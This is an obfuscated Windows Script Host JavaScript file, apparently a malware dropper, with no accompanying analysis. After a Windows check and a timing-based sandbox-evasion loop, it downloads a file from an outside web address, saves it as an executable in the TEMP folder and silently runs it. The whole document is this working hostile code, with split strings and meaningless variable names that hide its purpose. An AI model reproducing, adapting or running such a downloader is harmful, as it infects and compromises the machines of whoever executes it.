var _G = false;
var _F0 = "CreateObject";
var _J = function _Z() {return WScript[_F0]("WScript"+".Shell");}(), _T = 11;
var _DW = "MSXML2.XMLHTTP";
var _ED = 2123213;
var _L0 = 0;
function _UT(_XB){_J["Run"](_XB, _L0, _L0);};
function _OT(){return _DW + "";};
function _M(_ZE, _YC){_L0 = _L0 * 1; return _ZE - _YC;};
function _F(){return _F0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _G = true;
  @end
@*/
if (_G)
{
var _N = "";
function _BP(){return 22;};
var _TX = 0; var _I = 0;
function _R()
{
var _F2 = new this["Date"]();
var _E = _F2["getUTCMilliseconds"]();
WScript["Sleep"](_BP());
var _F2 = new this["Date"]();
var _F1 = _F2["getUTCMilliseconds"]();
WScript["Sleep"](_BP());
var _F2 = new this["Date"]();
var _Y0 = _F2["getUTCMilliseconds"]();
var _TX = "_CF";
_TX = _M(_F1, _E);
var _I = "_Z0";
_I = _M(_Y0, _F1);
_N = "open";
return _M(_TX, _I);
}
var _X = false;
var _X0 = false;
for (var _ML = _L0; _ML < _BP() * 1; _ML++){if (_R() != _L0){
_X = true; 
_I = "31" + 11 * _TX + _I; 
_X0 = true; 
break;
}}
function _L() {return ((_X == true) && (_X == _X0)) ? 1 : _L0;};
if (_X && _L() && _X0){
function _PM() {return _J["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "psMnIIWFcZg.ex" + "e";};
 _E0 = _OT();
 _FW = WScript[_F0](_E0);
 var _CR = 1;
 while (_CR){
try {
	if (_CR == 1)
	{
		_FW[_N]("GET", "http://itead-europe.com/k3ias", false);
		_FW["send"]();
		_HV = "Sleep";
	}
	WScript[_HV](_BP() + 120); 
	if (_FW["readystate"] < 2 * 2) continue;
	_CR = _L0;
	function _ZU(_Y) {var _GI = (1, 2, 3, 4, 5, _Y); return _GI;};
	_IH = WScript[_F()]("ADODB.Stream");
	_E0 = _IH;
	_E0[_N]();
	_E0["type"] = _ZU(1);
	_E0["write"](_FW["ResponseBody"]);
	_IH["position"] = _ZU(_L0);
	_E0["Save" + "ToFile"](_PM(), 2);
	_IH["cl"+"ose"]();
	_UX = _PM();
	_UT(_UX);
} catch(_K){};
}
}
}

